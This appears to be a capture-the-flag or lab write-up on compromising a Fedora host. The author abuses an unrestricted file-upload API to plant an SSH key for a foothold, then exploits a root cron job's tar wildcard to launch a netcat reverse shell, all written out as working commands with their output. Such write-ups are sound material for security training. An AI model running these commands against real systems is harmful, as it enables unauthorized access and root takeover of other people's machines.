## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.166.249
# HOSTNAME
fedora
# OPERATING SYSTEM
Fedora release 34 (Thirty Four)
NAME=Fedora
VERSION="34 (Server Edition)"
ID=fedora

# CREDENTIALS  
```
## OPEN PORTS DETAILS
```bash
21/tcp    open   ftp              syn-ack ttl 61 vsftpd 3.0.3
25022/tcp open   ssh              syn-ack ttl 61 OpenSSH 8.6 (protocol 2.0)
33414/tcp open   http             syn-ack ttl 61 Werkzeug httpd 2.2.3 (Python 3.9.13)
40080/tcp open   http             syn-ack ttl 61 Apache httpd 2.4.53 ((Fedora))
```
# ENUMERATION
## PORT 21
```bash
# Setting ip Variable
export ip=192.168.166.249

# Checking anonymous login
sudo ftp ftp://anonymous:anonymous@$ip
Connected to 192.168.166.249.
220 (vsFTPd 3.0.3)                         
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||50494|)  

- anonymous login allowed
- Unable to list contents
```
## PORT 33414
```bash
# Setting url Variable
export url=http://$ip:33414

# Tools used to Recon
sudo curl -I $url
sudo whatweb $url | sed 's/,/\n/g'
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -u $url/


# Recon
Web Server: Werkzeug/2.2.3 Python/3.9.13
Web Technology: Python/3.9.13

# Files
http://192.168.166.249:33414/help                 (Status: 200) [Size: 137]
http://192.168.166.249:33414/info                 (Status: 200) [Size: 98]

# http://192.168.166.249:33414/help  
0	"GET /info : General Info"
1	"GET /help : This listing"
2	"GET /file-list?dir=/tmp : List of the files"
3	"POST /file-upload : Upload files"

# http://192.168.166.249:33414/info 
0	"Python File Server REST API v2.5"
1	"Author: Alfredo Moroder"
2	"GET /help = List of the commands"

# Able to list directory contents
http://192.168.166.249:33414/file-list?dir=

# Found username
http://192.168.166.249:33414/file-list?dir=/home

- alfredo
```
## PORT 40080
```bash
# Setting url Variable
export url=http://$ip:40080

# Tools used to Recon
sudo curl -I $url
sudo whatweb $url | sed 's/,/\n/g'
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -u $url/


# Recon
Web Server: Apache/2.4.53 (Fedora)

# Files
http://192.168.166.249:40080/images               (Status: 301) [Size: 244] [--> http://192.168.166.249:40080/images/]
http://192.168.166.249:40080/index.html           (Status: 200) [Size: 1092]
http://192.168.166.249:40080/LICENSE              (Status: 200) [Size: 6555]
http://192.168.166.249:40080/styles               (Status: 301) [Size: 244] [--> http://192.168.166.249:40080/styles/]
```
## INITIAL FOOTHOLD
```bash
# Upload file - ssh key
http://192.168.166.249:33414/file-upload

- Generate ssh key
ssh-keygen -f myshell
cat myshell.pub > authorized_keys

- File upload
curl -X POST -F "file=@authorized_keys" http://192.168.166.249:33414/file-upload
{"message":"No filename part in the request"}

curl -X POST -F "file=@authorized_keys" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.166.249:33414/file-upload 
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}

curl -X POST -F "file=@authorized_keys.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.166.249:33414/file-upload
{"message":"File successfully uploaded"}

# SSH Login using private key
sudo ssh -i myshell alfredo@$ip -p 25022
Last failed login: Mon Jan  6 23:14:43 EST 2025 from 192.168.45.249 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
[alfredo@fedora ~]$ whoami
alfredo
```
## PRIVILEGE ESCALATION
```bash
# Cronjobs
[alfredo@fedora ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
# For details see man 4 crontabs
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/1 * * * * root /usr/local/bin/backup-flask.sh

[alfredo@fedora ~]$ ls -la /usr/local/bin/backup-flask.sh
-rwxr-xr-x. 1 root root 106 Mar 28  2023 /usr/local/bin/backup-flask.sh

[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

# Wildcard Privesc - Reference https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
[alfredo@fedora ~]$ cd /home/alfredo/restapi/
[alfredo@fedora restapi]$ mkfifo /tmp/lhennp; nc 192.168.45.249 21 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp
[alfredo@fedora restapi]$ echo "mkfifo /tmp/lhennp; nc 192.168.45.249 21 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
[alfredo@fedora restapi]$ echo "" > "--checkpoint-action=exec=sh shell.sh"
[alfredo@fedora restapi]$ echo "" > --checkpoint=1

sudo nc -nvlp 21
listening on [any] 21 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.166.249] 53786
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Tue Jan  7 09:10:12 2025 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.166.249
Nmap scan report for 192.168.166.249
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2025-01-07 09:10:14 IST for 147s
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON         VERSION

21/tcp    open   ftp              syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp    closed ssh              reset ttl 61
111/tcp   closed rpcbind          reset ttl 61
139/tcp   closed netbios-ssn      reset ttl 61
443/tcp   closed https            reset ttl 61
445/tcp   closed microsoft-ds     reset ttl 61
2049/tcp  closed nfs              reset ttl 61
10000/tcp closed snet-sensor-mgmt reset ttl 61

25022/tcp open   ssh              syn-ack ttl 61 OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD6xv/PZkusP5TZdYJWDT8TTNY2xojo5b2DU/zrXm1tP4kkjNCGmwq8UwFrjo5EbEbk3wMmgHBnE73XwgnqaPd4=
|   256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRX3RvvSVPY3FJV9u7N2xIQbLJgQoEMkmRMey39/Jxz

33414/tcp open   http             syn-ack ttl 61 Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13

40080/tcp open   http             syn-ack ttl 61 Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)


Service Info: OS: Unix

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  7 09:12:41 2025 -- 1 IP address (1 host up) scanned in 149.12 seconds

```

